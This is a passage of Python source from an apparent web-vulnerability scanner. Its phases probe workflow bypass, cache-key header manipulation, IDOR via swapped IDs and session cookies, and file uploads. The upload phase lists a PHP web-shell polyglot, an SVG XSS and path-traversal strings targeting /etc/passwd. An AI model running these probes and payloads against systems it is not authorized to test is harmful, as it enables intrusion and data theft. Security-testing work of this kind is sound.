    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"76-WORKFLOW"}:
        return {}
    _out = outdir / "workflow_bypass.txt"
    if _out.exists() and not force:
        return {"76-WORKFLOW": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 76-WORKFLOW: multi-step workflow bypass detection")
    findings: List[str] = []
    _wf_urlopen = _get_urlopener()
    _wf_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        log("warn", "76-WORKFLOW: no URLs; skipping")
        return {"76-WORKFLOW": str(_out), "count": 0}
    # Identify potential workflow endpoints (checkout, order, payment, submit, etc.)
    workflow_keywords = {
        "cart", "checkout", "order", "payment", "billing", "submit",
        "confirm", "complete", "register", "enroll", "purchase",
        "booking", "reservation", "checkin", "review", "apply",
    }
    workflow_urls: List[str] = []
    for u in read_lines(urls_file):
        u_lower = u.lower()
        if any(kw in u_lower for kw in workflow_keywords):
            workflow_urls.append(u)
    if not workflow_urls:
        findings.append("[result] No workflow endpoints detected")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"76-WORKFLOW": str(_out), "count": 0}
    findings.append(f"[workflow-endpoints] found {len(workflow_urls)} potential workflow endpoints")
    for u in sorted(set(workflow_urls))[:30]:
        findings.append(f"  {u}")
    # Test direct access to POST-only endpoints via GET (workflow skip)
    _wf_sem = asyncio.Semaphore(10)
    for u in sorted(set(workflow_urls))[:10]:
        base = u if u.startswith("http") else f"https://{u}"
        async with _wf_sem:
            await _throttle_rate()
            for method in ("GET", "POST", "PUT", "PATCH", "DELETE"):
                try:
                    req = urllib.request.Request(base, method=method,
                        headers={"User-Agent": "Mozilla/5.0", **_wf_headers})
                    status, _, _ = await _async_urlopen(_wf_urlopen, req, timeout=10)
                    if status in (200, 201, 202, 204):
                        findings.append(f"[bypass] {method} {base} → HTTP {status} (may skip workflow)")
                except urllib.error.HTTPError as e:
                    if e.code in (401, 403):
                        pass
                    elif e.code in (405, 501):
                        findings.append(f"[expected] {method} {base} → HTTP {e.code} (method not allowed)")
                    else:
                        findings.append(f"[probed] {method} {base} → HTTP {e.code}")
                except Exception:
                    pass
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"76-WORKFLOW: {len(findings)} workflow findings → {out}")
    return {"76-WORKFLOW": str(_out), "count": len(findings)}


# ───────────────────── Phase 77-CACHEKEY: cache key probing ─────────────────────
async def phase_77_CACHEKEY(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"77-CACHEKEY"}:
        return {}
    _out = outdir / "cache_key_probe.txt"
    if _out.exists() and not force:
        return {"77-CACHEKEY": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 77-CACHEKEY: cache key composition probing")
    findings: List[str] = []
    _ck_urlopen = _get_urlopener()
    _ck_headers = _extra_headers_dict()
    targets_file = outdir / "host_targets.txt"
    if not targets_file.exists() or not read_lines(targets_file):
        log("warn", "77-CACHEKEY: no targets; skipping")
        return {"77-CACHEKEY": str(_out), "count": 0}
    _ck_sem = asyncio.Semaphore(5)
    def _cache_key_signature(headers: Any) -> str:
        age = headers.get("age", "0")
        cf_cache = headers.get("cf-cache-status", headers.get("x-cache", ""))
        etag = headers.get("etag", "")[:20]
        last_modified = headers.get("last-modified", "")[:20]
        return f"Age={age} CF={cf_cache} ETag={etag} LM={last_modified}"
    test_headers = [
        ("X-Forwarded-Host", "evil.com"),
        ("X-Forwarded-Port", "9999"),
        ("X-Http-Method-Override", "POST"),
        ("X-Original-URL", "/admin"),
        ("X-Rewrite-URL", "/admin"),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("X-Real-IP", "127.0.0.1"),
        ("X-Originating-IP", "127.0.0.1"),
        ("Accept", "application/json"),
        ("Accept-Encoding", "gzip"),
        ("X-Forwarded-Proto", "http"),
    ]
    for host in read_lines(targets_file)[:5]:
        base = host if host.startswith("http") else f"https://{host}"
        paths_to_probe = ["/", "/admin", "/api", "/login", "/robots.txt"]
        async with _ck_sem:
            await _throttle_rate()
            for path in paths_to_probe:
                url = f"{base.rstrip('/')}{path}"
                try:
                    baseline_req = urllib.request.Request(url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_ck_headers})
                    _, baseline_headers, _ = await _async_urlopen(_ck_urlopen, baseline_req, timeout=10)
                    baseline_sig = _cache_key_signature(baseline_headers)
                    for hdr_name, hdr_val in test_headers:
                        await _throttle_rate()
                        try:
                            test_req = urllib.request.Request(url, method="GET",
                                headers={"User-Agent": "Mozilla/5.0", hdr_name: hdr_val, **_ck_headers})
                            _, test_headers_resp, _ = await _async_urlopen(_ck_urlopen, test_req, timeout=10)
                            test_sig = _cache_key_signature(test_headers_resp)
                            if test_sig != baseline_sig:
                                findings.append(f"[cache-key-factor] {url} header={hdr_name}:{hdr_val} differs from baseline")
                                findings.append(f"  baseline={baseline_sig}")
                                findings.append(f"  test={test_sig}")
                        except Exception:
                            continue
                except Exception:
                    continue
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"77-CACHEKEY: {len(findings)} cache key findings → {out}")
    return {"77-CACHEKEY": str(_out), "count": len(findings)}


# ───────────────────── Phase 78-FILEUPLOADADV: advanced file upload testing ─────────────────────
async def phase_78_FILEUPLOADADV(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"78-FILEUPLOADADV"}:
        return {}
    _out = outdir / "file_upload_adv.txt"
    if _out.exists() and not force:
        return {"78-FILEUPLOADADV": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 78-FILEUPLOADADV: advanced file upload polyglot + path traversal")
    findings: List[str] = []
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        log("warn", "78-FILEUPLOADADV: no URLs; skipping")
        return {"78-FILEUPLOADADV": str(_out), "count": 0}
    upload_indicators = ["upload", "file", "image", "avatar", "profile", "attachment",
                         "document", "import", "media", "photo", "resume", "csv"]
    _skip_domains = ("jimcdn.com", "jimdo.com", "cdn.", "assets.", "static.", "img.", "images.")
    upload_urls: List[str] = []
    for u in read_lines(urls_file):
        u_lower = u.lower()
        if any(sd in u_lower for sd in _skip_domains):
            continue
        if any(ind in u_lower for ind in upload_indicators):
            upload_urls.append(u)
    if not upload_urls:
        findings.append("[result] No file upload endpoints discovered")
    else:
        findings.append(f"[upload-endpoints] found {len(upload_urls)} potential upload endpoints")
        for u in sorted(set(upload_urls))[:15]:
            findings.append(f"  {u}")
    findings.append("")
    findings.append("--- Polyglot Test Payloads ---")
    _polyglot_payloads = {
        "svg_xss": '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
        "gif_header": "GIF89a<?php system($_GET['cmd']); ?>",
        "jpg_header": "\xFF\xD8\xFF\xE0<?php echo 'test'; ?>",
        "png_header": "\x89PNG\r\n\x1a\n<?php echo 'test'; ?>",
        "zip_slip": "PK\x03\x04...",
    }
    for name, payload in _polyglot_payloads.items():
        findings.append(f"  [{name}] {payload[:60]}...")
    findings.append("")
    findings.append("--- Path Traversal Payloads ---")
    _traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
    ]
    for payload in _traversal_payloads:
        findings.append(f"  [traversal] filename={payload}")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"78-FILEUPLOADADV: {len(findings)} file upload findings → {out}")
    return {"78-FILEUPLOADADV": str(_out), "count": len(findings)}

async def phase_81_IDORFUZZ(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
    cfg: Optional[Any] = None,
) -> Dict[str, Any]:
    if skip & {"81-IDORFUZZ"}:
        return {}
    _out = outdir / "idor_fuzz.txt"
    if _out.exists() and not force:
        return {"81-IDORFUZZ": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 81-IDORFUZZ: cross-session IDOR diffing")
    findings: List[str] = []
    _id_urlopen = _get_urlopener()
    _id_headers = _extra_headers_dict()
    cookie_a = (getattr(cfg, 'idor_session_a', '') or "") or os.environ.get("COOKIE_A", os.environ.get("COOKIE", ""))
    cookie_b = (getattr(cfg, 'idor_session_b', '') or "") or os.environ.get("COOKIE_B", "")
    if not cookie_a and not cookie_b:
        log("warn", "81-IDORFUZZ: set COOKIE_A and COOKIE_B env vars for cross-session diffing")
        log("info", "81-IDORFUZZ: running in single-session mode (no diff)")
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        log("warn", "81-IDORFUZZ: no URLs; skipping")
        return {"81-IDORFUZZ": str(_out), "count": 0}
    idor_sensitive_params = ["id", "user_id", "uid", "account", "account_id", "customer",
                             "order", "order_id", "document", "file_id", "profile_id",
                             "invoice", "payment", "transaction", "ref", "token"]
    target_urls: List[str] = []
    for u in read_lines(urls_file):
        u_lower = u.lower()
        if any(p in u_lower for p in idor_sensitive_params):
            target_urls.append(u)
    if not target_urls:
        target_urls = read_lines(urls_file)
    findings.append(f"[idor-targets] {len(target_urls)} candidate URLs")
    _id_sem = asyncio.Semaphore(10)
    for u in sorted(set(target_urls))[:30]:
        if not u.startswith("http"):
            u = f"https://{u}"
        async with _id_sem:
            await _throttle_rate()
            # Probe with different user IDs
            variations = {
                "id": ["1", "2", "1000", "999999", "admin", "00000000-0000-0000-0000-000000000000"],
                "user_id": ["1", "2", "0", "-1", "admin"],
                "uid": ["1", "2", "0", "-1"],
                "account": ["1", "2", "admin"],
                "order": ["1", "2", "1000"],
            }
            parsed = urllib.parse.urlparse(u)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not qs:
                continue
            for pname in qs:
                if pname.lower() in idor_sensitive_params:
                    for pval in variations.get(pname.lower(), ["1", "2"]):
                        test_qs = qs.copy()
                        test_qs[pname] = [pval]
                        new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                        test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                        for session_label, session_cookie in [("A", cookie_a), ("B", cookie_b)]:
                            if not session_cookie:
                                continue
                            try:
                                sess_headers = {"User-Agent": "Mozilla/5.0", "Cookie": session_cookie, **_id_headers}
                                req = urllib.request.Request(test_url, method="GET", headers=sess_headers)
                                status_a, headers_a, body_bytes_a = await _async_urlopen(_id_urlopen, req, timeout=10)
                                findings.append(f"[idor-{session_label}] {test_url} → HTTP {status_a} len={len(body_bytes_a)}")
                            except urllib.error.HTTPError as e:
                                findings.append(f"[idor-{session_label}] {test_url} → HTTP {e.code}")
                            except Exception:
                                pass
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"81-IDORFUZZ: {len(findings)} IDOR probes → {out}")
    return {"81-IDORFUZZ": str(_out), "count": len(findings)}
